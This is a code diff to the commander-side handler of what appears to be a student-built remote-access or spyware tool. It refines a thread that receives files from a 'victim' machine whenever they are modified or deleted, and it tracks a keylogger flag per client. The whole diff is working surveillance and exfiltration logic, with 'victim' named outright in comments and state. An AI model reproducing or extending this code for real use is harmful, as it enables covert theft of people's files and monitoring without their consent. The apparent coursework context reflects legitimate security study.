@@ -720,56 +720,93 @@ def watch_file_client_socket(client_socket: socket.socket,
                              client_ip: str,
                              client_port: int,
                              is_keylog: bool):
-
     while True:
-        # Check if a stop signal is received; remove signal from queue and send signal to client
-        if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
+        try:
+            # Check if a stop signal is received; remove signal from queue and send signal to client
+            if not signal_queue.empty() and signal_queue.get() == constants.STOP_KEYWORD:
+                client_socket.send(constants.STOP_KEYWORD.encode())
+                break
+
+            # Get Event from Client [STUCK HERE??????]
+            event = client_socket.recv(20).decode()
+
+            # MODIFY: Get File If Modified
+            if event == "IN_MODIFY":
+                file_name = create_file_name(file_path)
+                new_file_path = sub_directory_path + "/" + file_name
+
+                # Receive Modified File
+                with open(new_file_path, "wb") as file:
+                    eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker
+
+                    while True:
+                        file_data = client_socket.recv(1024)
+                        if not file_data:
+                            break  # No more data received
+                        if file_data.endswith(eof_marker):
+                            file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
+                            break
+                        else:
+                            file.write(file_data)
+
+                if is_file_openable(new_file_path):
+                    print(constants.WATCH_FILE_TRANSFER_SUCCESS_MODIFY.format(file_name))
+                else:
+                    print(constants.FILE_TRANSFER_ERROR)
+
+            # DELETED: Move File to Deleted Directory (as Backup)
+            if event == "IN_DELETE" or event == "IN_DELETE_SELF":
+                file_name = create_file_name(file_path)
+
+                # Check if a "deleted" directory exists, if not, create a deleted folder
+                deleted_dir_path = sub_directory_path + "/" + constants.DELETED_DIRECTORY
+                if not os.path.exists(deleted_dir_path):
+                    print(constants.CREATE_DOWNLOAD_DIRECTORY_PROMPT.format(deleted_dir_path))
+                    os.mkdir(deleted_dir_path)
+                    print(constants.DIRECTORY_SUCCESS_MSG)
+
+                # Generate new file path
+                deleted_file_path = deleted_dir_path + "/" + file_name
+
+                # Receive Modified File
+                with open(deleted_file_path, "wb") as file:
+                    eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker
+
+                    while True:
+                        file_data = client_socket.recv(1024)
+                        if not file_data:
+                            break  # No more data received
+                        if file_data.endswith(eof_marker):
+                            file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
+                            break
+                        else:
+                            file.write(file_data)
+
+                if is_file_openable(deleted_file_path):
+                    print(constants.WATCH_FILE_TRANSFER_SUCCESS_DELETION.format(file_name))
+                else:
+                    print(constants.FILE_TRANSFER_ERROR)
+
+                # Set socket timeout (for 5 seconds) because there is no more file to watch!
+                client_socket.settimeout(5)
+
+        except TimeoutError:
+            print(constants.WATCH_FILE_DELETE_DETECTED_MSG.format(file_path, client_ip, client_port))
+            print(constants.WATCH_FILE_THREAD_TERMINATING)
+
+            # Reset is_watching_file flag to default (False)
+            client_list[client_socket] = (client_ip, client_port, is_keylog, False)
+
+            # Reset SetTimeOut Timer (to prevent disconnection)
+            client_socket.settimeout(None)
+
+            # Send a signal back to client/victim to stop their watch_file_stop_signal() thread
             client_socket.send(constants.STOP_KEYWORD.encode())
-            break
 
-        # Get Event from Client
-        event = client_socket.recv(20).decode()
-
-        # MODIFY: Get File If Modified
-        if event == "IN_MODIFY":
-            file_name = create_file_name(file_path)
-            new_file_path = sub_directory_path + "/" + file_name
-
-            # Receive Modified File
-            with open(new_file_path, "wb") as file:
-                eof_marker = constants.END_OF_FILE_SIGNAL  # Define the end-of-file marker
-
-                while True:
-                    file_data = client_socket.recv(1024)
-                    if not file_data:
-                        break  # No more data received
-                    if file_data.endswith(eof_marker):
-                        file.write(file_data[:-len(eof_marker)])  # Exclude the end-of-file marker
-                        break
-                    else:
-                        file.write(file_data)
-
-            if is_file_openable(new_file_path):
-                print(constants.WATCH_FILE_TRANSFER_SUCCESS_MODIFY.format(file_name))
-            else:
-                print(constants.FILE_TRANSFER_ERROR)
-
-        # DELETED: Move File to Deleted Directory
-        if event == "IN_DELETE" or event == "IN_DELETE_SELF":
-            file_name = create_file_name(file_path)
-            new_file_path = sub_directory_path + file_name
-            print(new_file_path)
+            print(constants.THREAD_STOPPED_MSG)
+            return None
 
     # Set WATCH_FILE status to false (Before ending thread)
     client_list[client_socket] = (client_ip, client_port, is_keylog, False)
-    print("[+] ENDING THREAD: WATCH_FILE_THREAD has terminated!")
-    print("[+] WATCH FILE SUCCESSFUL: You have stopped watching the file...")
-
-    # REQUIREMENTS
-    # 1) The victim will send you files as they change.
-    #    If the file is added or modified, store it in the ip-based directory.
-
-    # 2) If a file is deleted on the victim (event), do not delete it on the commander.
-
-    # 3) Instead of deleting, move the deleted file to a “deleted” directory
-    #    (limitation: do not test with a directory named deleted)
+    print(constants.WATCH_FILE_THREAD_STOP)
+    print(constants.WATCH_FILE_THREAD_STOP_SUCCESS)
